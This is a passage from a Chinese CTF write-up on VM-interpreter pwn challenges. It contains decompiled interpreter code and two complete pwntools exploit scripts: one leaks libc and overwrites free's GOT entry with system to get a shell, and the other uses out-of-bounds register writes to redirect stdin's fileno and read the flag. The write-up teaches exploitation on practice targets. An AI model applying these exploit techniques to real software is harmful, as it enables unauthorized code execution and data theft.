                v25 = *(char *)(node_addr->malloc_addr + 1) + node_addr->malloc_addr;
              else
                v25 = node_addr->malloc_addr + 2;
              node_addr->malloc_addr = v25;
              break;
            case 4:
              if ( node_addr->idx9 & 0x100000 || node_addr->idx9 & 0x80000 )
                node_addr->malloc_addr += *(char *)(node_addr->malloc_addr + 1);
              else
                node_addr->malloc_addr += 2;
              break;
            case 5:
              if ( node_addr->idx9 & 0x100000 || node_addr->idx9 & 0x40000 )
                node_addr->malloc_addr += *(char *)(node_addr->malloc_addr + 1);
              else
                node_addr->malloc_addr += 2;
              break;
            default:
              if ( (*(_BYTE *)node_addr->malloc_addr & 0xF) != 7 )
                exit(-1);
              node_addr->malloc_addr += *(_DWORD *)(node_addr->malloc_addr + 1);
              break;
          }
        }
        else
        {
          if ( node_addr->idx9 & 0x100000 )
            v22 = *(char *)(node_addr->malloc_addr + 1) + node_addr->malloc_addr;
          else
            v22 = node_addr->malloc_addr + 2;
          node_addr->malloc_addr = v22;
        }
      }
      else
      {
        if ( choice != 0xC0 )
LABEL_121:
          exit(-1);
        node_addr->malloc_addr += *(char *)(node_addr->malloc_addr + 1);
      }
    }
    else
    {
      switch ( choice )
      {
        case 0x90:
          ++node_addr->malloc_addr;
          break;
        case 0xA0:
          if ( *(_BYTE *)node_addr->malloc_addr & 0xF )
          {
            if ( (*(_BYTE *)node_addr->malloc_addr & 0xF) != 3 )
              exit(-1);
            v16 = (unsigned __int8 *)GetReg(node_addr, 1u);
            *(&node_addr->idx0 + *v16) &= *(_DWORD *)(node_addr->malloc_addr + 2);
            node_addr->malloc_addr += 6;
          }
          else
          {
            v15 = *(_BYTE *)GetReg(node_addr, 1u);
            *(&node_addr->idx0 + v15) &= *(&node_addr->idx0 + *(unsigned __int8 *)GetReg(node_addr, 2u));
            node_addr->malloc_addr += 3;
          }
          break;
        case 0x80:
          *(&node_addr->idx0 + *(unsigned __int8 *)GetReg(node_addr, 1u)) = *(_DWORD *)node_addr->calloc_addr_fc;
          node_addr->calloc_addr_fc += 4;
          node_addr->malloc_addr += 2;
          break;
        default:
          goto LABEL_121;
      }
    }
  }
  result = node_addr;
  ++node_addr->malloc_addr;
  return result;
}

```

### exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='i386',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./pwn')

if debug:
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    p = process('./pwn')
    gadgets = [0x3ac5c,0x3ac5e,0x3ac62,0x3ac69,0x5fbc5,0x5fbc6]
else:
    gadgets = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]
    libc = ELF('./x86_libc.so.6')
    p = remote('f.buuoj.cn',20171)

def New(payload):
    p.recvuntil('>>> ')
    p.sendline('1')
    sleep(0.1)
    p.sendline(payload)

def Play():
    p.recvuntil('>>> ')
    p.sendline('2')

def Free():
    p.recvuntil('>>> ')
    p.sendline('3')


def exp():
    #leak libc

    payload = p8(0x43)+p8(3)+p32(elf.got['puts'])
    payload += p8(0x10)+p8(0x1)
    payload += p8(0x43)+p8(3)+p32(1)
    payload += p8(0x10)+p8(0x1)
    payload += p8(0x43)+p8(3)+p32(1)
    payload += p8(0x10)+p8(0x1)
    payload += p8(0x43)+p8(3)+p32(1)
    payload += p8(0x10)+p8(0x1)
    payload += p8(0xb0)
    New(payload)
    raw_input()


    Play()
    libc_base = u32(p.recvn(4)) - libc.sym['puts']
    system = libc_base + libc.sym['system']
    log.success("libc base => " + hex(libc_base))
    Free()
    #get shell
    payload = p8(0x43)+p8(0)+p32(0x6e69622f)
    payload += p8(0x43)+p8(1)+p32(0x0068732f)
    payload += p8(0x43)+p8(3)+p32(elf.got['free'])
    payload += p8(0x10)+p8(0)
    payload += p8(0x43)+p8(3)+p32(1)
    payload += p8(0x10)+p8(0)
    payload += p8(0x43)+p8(3)+p32(1)
    payload += p8(0x10)+p8(0)

    payload += p8(0xb0)
    New(payload)
    gdb.attach(p,'''
            b* 0x0804873e
            b* 0x08048a97
            ''')
    Play()
    raw_input()
    p.send(p8(system&0xff))
    raw_input()
    p.send(p8((system&0xffff)>>8))
    raw_input()
    p.send(p8((system&0xffffff)>>16))
    Free()
    p.interactive()

exp()

```

## 粤湾中心

### 前言

发了之后发现红帽还有道VmPwn，今天做完补一下

### 程序逻辑

输入esp/eip/code，开始有seccomp禁止执行execve，welcome里把flag读了出来并且fddup拷贝到了`0x233`，这就很像19年信安竞赛的题，我们想办法改stdin的filno为0x233，在最后say goodbye调用printf的时候会输出flag。

```c

unsigned __int64 welcome()
{
  __int64 fd; // [rsp+0h] [rbp-10h]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  fd = open("/flag", 0);
  if ( fd == -1 )
  {
    puts("What?");
    exit(-1);
  }
  dup2(fd, 0x233);
  close(fd);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  memset(regs, 0, 0x20uLL);
  puts(" _______     ____  ____  ____   ____  ____    ____  ");
  puts("|_   __    |_   ||   _||_  _| |_  _||_     /   _| ");
  puts("  | |__) |    | |__| |        / /    |   /   |   ");
  puts("  |  __ /     |  __  |       / /     | |  /| |   ");
  puts(" _| |   _  _| |  | |_      ' /     _| |_/_| |_  ");
  puts("|____| |___||____||____|     _/     |_____||_____| ");
  puts("---------------------------------------------------");
  alarm(0x20u);
  return __readfsqword(0x28u) ^ v2;
}

void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  __int64 len; // [rsp+0h] [rbp-30h]
  __int64 is_shown; // [rsp+8h] [rbp-28h]
  unsigned __int64 i; // [rsp+10h] [rbp-20h]
  node *code_addr; // [rsp+18h] [rbp-18h]
  __int64 v7; // [rsp+20h] [rbp-10h]
  unsigned __int64 v8; // [rsp+28h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  len = 0LL;
  i = 0LL;
  code_addr = 0LL;
  v7 = 0LL;
  is_shown = 1LL;
  welcome();
  Seccomp();
  puts("tH1s 1s 4 e45y cH411en9e!");
  printf("EIP: ", a2);
  __isoc99_scanf("%ld", &_eip);
  printf("ESP: ", &_eip);
  __isoc99_scanf("%ld", &_esp);
  if ( _esp < 0 )
    ErrorExit();
  puts("Give me code length: ");
  __isoc99_scanf("%ld", &len);
  if ( len > 0x28 || len < 0 )
    ErrorExit();
  puts("Give me code: ");
  code_addr = (node *)calloc(1uLL, 8 * len);
  reg_addr = (__int64)calloc(1uLL, 0x1000uLL);
  for ( i = 0LL; i < len; ++i )
    get_input((__int64)&code_addr[i]);
  while ( (unsigned int)_eip < len )
  {
    main_method(&code_addr[_eip], &is_shown, len);
    ++_eip;
    usleep(0xC350u);
  }
  Bye();
}
```

主要的功能函数相对来说比较简单，主要是对8个寄存器的值进行计算以及一个malloc到bss上的堆地址的赋值

```c

unsigned __int64 __fastcall main_method(node *code, _QWORD *is_shown, unsigned __int64 code_len)
{
  int v3; // eax
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  if ( _esp > 0x1000 || _esp < 0 || code->low2 > 8u || code->low1 > 8u || code_len < (unsigned int)_eip )
    ErrorExit();
  v3 = code->code_low_6;
  if ( code->code_low_6 == 0x70 )
  {
    SetReg_0(&regs[(unsigned __int8)code->low1]);// set stdin's fileno
  }
  else if ( v3 > 0x70 )
  {
    if ( v3 == 0xC0 )
    {
      Mul(&regs[(unsigned __int8)code->low2], &regs[(unsigned __int8)code->low1]);
    }
    else if ( v3 > 0xC0 )
    {
      switch ( v3 )
      {
        case 0xE0:
          LeftMv(&regs[(unsigned __int8)code->low2], &regs[(unsigned __int8)code->low1]);
          break;
        case 0xF0:
          RightMv(&regs[(unsigned __int8)code->low2], &regs[(unsigned __int8)code->low1]);
          break;
        case 0xD0:
          Sub(&regs[(unsigned __int8)code->low2], &regs[(unsigned __int8)code->low1]);
          break;
      }
    }
    else
    {
      switch ( v3 )
      {
        case 0xA0:
          Add(&regs[(unsigned __int8)code->low2], &regs[(unsigned __int8)code->low1]);// add useful!
          break;
        case 0xB0:
          Div(&regs[(unsigned __int8)code->low2], &regs[(unsigned __int8)code->low1]);
          break;
        case 0x80:
          SetReg(&regs[(unsigned __int8)code->low1]);// overflow?
          break;
      }
    }
  }
  else if ( v3 == 0x41 )
  {
    ArbWrite(&regs[(unsigned __int8)code->low2], &regs[(unsigned __int8)code->low1]);
  }
  else if ( v3 > 0x41 )
  {
    switch ( v3 )
    {
      case 0x50:
        SubEip(&regs[(unsigned __int8)code->low1]);
        break;
      case 0x60:
        if ( *is_shown )
          Show();
        break;
      case 0x42:
        ArbRead(&regs[(unsigned __int8)code->low2], &regs[(unsigned __int8)code->low1]);// mov stdin to reg
        break;
    }
  }
  else
  {
    switch ( v3 )
    {
      case 0x20:
        Or(&regs[(unsigned __int8)code->low2], &regs[(unsigned __int8)code->low1]);
        break;
      case 0x40:
        Mov(&regs[(unsigned __int8)code->low2], (unsigned __int8)code->low1);// set reg[low2] using low1
        break;
      case 0x10:
        Xor(&regs[(unsigned __int8)code->low2], &regs[(unsigned __int8)code->low1]);
        break;
    }
  }
  return __readfsqword(0x28u) ^ v5;
}
```

我们可以通过一些加减操作构造`reg[i]`为任意值，而其中有几个函数的`reg[i]`类型为signed int，因此会前溢越界，先把stdin的低4字节拷贝到reg里加0x6c到fileno的位置-4再把它放回到reg_addr的位置，SetReg_0即可往里写0x233
```c
unsigned __int64 __fastcall ArbRead(signed int *a1, signed int *a2)
{
  unsigned __int64 v2; // ST18_8

  v2 = __readfsqword(0x28u);
  regs[*a1] = dword_203080[*a2];                // 越界
  return __readfsqword(0x28u) ^ v2;
}

unsigned __int64 __fastcall SetReg_0(_DWORD *a1)
{
  unsigned __int64 v1; // ST18_8

  v1 = __readfsqword(0x28u);
  *(_DWORD *)(reg_addr + 4LL * ++_esp) = *a1;
  return __readfsqword(0x28u) ^ v1;
}
```

### exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./pwn')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./pwn')

else:
    libc = ELF('./x64_libc.so.6')
    p = remote('f.buuoj.cn',20173)

def Pack(choice,low2,low1):
    return str(((choice)<<16) + (low2<<8) + low1)

def exp():
    p.sendlineafter("EIP: ","0")
    p.sendlineafter("ESP: ","0")
    payload = []
    #-12:stdin
    payload.append(Pack(0x40,0,8))#0:8
    payload.append(Pack(0x40,1,4))#1:4
    payload.append(Pack(0x40,3,2))#3:2
    payload.append(Pack(0x40,4,1))#4:1
    payload.append(Pack(0x40,6,1))#6:1
    payload.append(Pack(0xa0,0,0))#0:16
    payload.append(Pack(0xa0,0,1))#0:20
    payload.append(Pack(0xd0,2,0))#2:-20
    payload.append(Pack(0xd0,5,3))#5:-2
    payload.append(Pack(0x42,5,2))#reg[-2]:stdin
    payload.append(Pack(0xd0,4,0))#4:-21
    payload.append(Pack(0xa0,6,5))#6:-1
    payload.append(Pack(0x42,6,4))#reg[-1]:stdin+4
    #now reg_addr(malloc) is stdin_addr
    #still we need to add 0x70 to it
    for i in range(2):
        payload.append(Pack(0xa0,0,0))#0:16
    for i in range(7):
        payload.append(Pack(0xa0,0,1))#0:16
    payload.append(Pack(0xd0,7,3))
    #mov stdin to reg[3]
    #payload.append(Pack(0x40,3,3))#33
    payload.append(Pack(0x42,3,2))

    payload.append(Pack(0xa0,2,0))
    #mov reg[2] to reg[-2]
    #arb write
    payload.append(Pack(0x41,1,2))
    payload.append(Pack(0x42,7,1))
    #now we make 0x233
    for i in range(2):
        payload.append(Pack(0xa0,0,0))#0:16
    for i in range(5):
        payload.append(Pack(0xa0,1,1))#0:16

    payload.append(Pack(0xa0,0,1))#0:16
    payload.append(Pack(0x40,1,3))#0:8
    payload.append(Pack(0xa0,0,1))#0:16
    # now we can really write
    payload.append(Pack(0x70,0,0))


    p.sendlineafter("Give me code length:",str(len(payload)))
    p.recvuntil("Give me code:")
    gdb.attach(p,'''
            b * 0x0000555555554000+0x1710
            ''')
    for i in range(0,len(payload)):
        p.sendline(payload[i])

    p.interactive()

exp()

```

## 总结

VmPwn对于逆向要求的更多，要理清楚各个函数对应操作的指令。不太懂的时候可以动态地调试查看各种操作造成的结果。虽然慢，但是慢慢来也会理清楚，现在看到的大多数都是越界读写造成的问题，有时候也不需要泄露libc地址，直接通过mov等指令结合add/sub计算得到system或one_gadget。最终getshell。
